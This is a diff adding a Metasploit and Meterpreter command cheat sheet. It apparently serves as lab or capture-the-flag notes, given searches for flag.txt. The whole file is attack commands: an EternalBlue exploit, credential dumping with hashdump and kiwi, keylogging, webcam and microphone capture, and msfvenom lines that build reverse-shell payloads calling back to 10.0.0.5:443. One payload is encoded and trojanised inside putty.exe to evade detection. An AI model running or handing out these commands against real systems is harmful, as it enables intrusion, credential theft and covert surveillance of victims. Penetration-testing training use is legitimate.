@@ -1,0 +1,132 @@
+msfconsole -q
+
+help
+?
+search
+search name:vsftpd
+search cve:2021
+search type:exploit platform:windows
+
+use exploit/windows/smb/ms17_010_eternalblue
+use auxiliary/scanner/portscan/tcp
+use payload/windows/meterpreter/reverse_tcp
+
+back
+info
+
+show exploits
+show auxiliary
+show payloads
+show encoders
+show nops
+show options
+
+set RHOSTS 192.168.1.10
+set RHOST 192.168.1.10
+set RPORT 4444
+set LHOST 10.0.0.5
+set LPORT 443
+set PAYLOAD windows/meterpreter/reverse_tcp
+set TARGET 0
+set AutoRunScript migrate -f
+
+unset RHOSTS
+unset all
+
+run
+exploit
+exploit -z
+exploit -j
+check
+
+sessions
+sessions -l
+sessions -i 1
+sessions -u 1
+sessions -k 1
+sessions -c "whoami"
+sessions -s shell_to_meterpreter
+
+background
+shell
+sysinfo
+getuid
+getpid
+ps
+migrate 1234
+kill 1234
+help
+exit
+
+upload /local/file.txt C:\\Windows\\Temp\\
+download C:\\Windows\\Temp\\file.txt /tmp/
+
+search -f *.config
+search -f flag.txt
+
+getsystem
+getsystem -t 1
+hashdump
+meterpreter > load kiwi
+creds_all
+lsa_dump_sam
+wlan_ap
+
+run post/windows/gather/hashdump
+run post/windows/gather/enum_logged_on_users
+run post/multi/recon/local_exploit_suggester
+run post/windows/manage/migrate
+
+screenshot
+record_mic
+webcam_snap
+keyscan_start
+keyscan_dump
+keyscan_stop
+
+shell
+chcp 65001
+whoami
+hostname
+ipconfig /all
+systeminfo
+tasklist
+net user
+net localgroup administrators
+netstat -ano
+dir /s flag.txt
+
+msfvenom -l payloads
+msfvenom -l encoders
+msfvenom -l formats
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f exe -o shell.exe
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f elf -o shell.elf
+msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f raw -o shell.php
+msfvenom -p java/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f jar -o shell.jar
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -e x86/shikata_ga_nai -i 5 -f exe -o shell.exe
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f psh-reflection -o shell.ps1
+msfvenom -p cmd/windows/reverse_powershell LHOST=10.0.0.5 LPORT=443 -o shell.bat
+msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -o shell.py
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f exe -o shell.exe
+msfvenom -p windows/meterpreter_reverse_http LHOST=10.0.0.5 LPORT=443 -f exe -o shell.exe
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f exe -e x86/shikata_ga_nai -i 5 -x /usr/share/windows-binaries/putty.exe -k -o shell.exe
+
+resource script.rc
+msfconsole -r script.rc
+
+setg RHOSTS 192.168.1.0/24
+setg THREADS 50
+
+db_nmap -A 192.168.1.0/24
+db_nmap -p 445 192.168.1.0/24
+hosts
+services
+vulns
+creds
+
+exploit -j
+handler -H 10.0.0.5 -P 443 -p windows/meterpreter/reverse_tcp
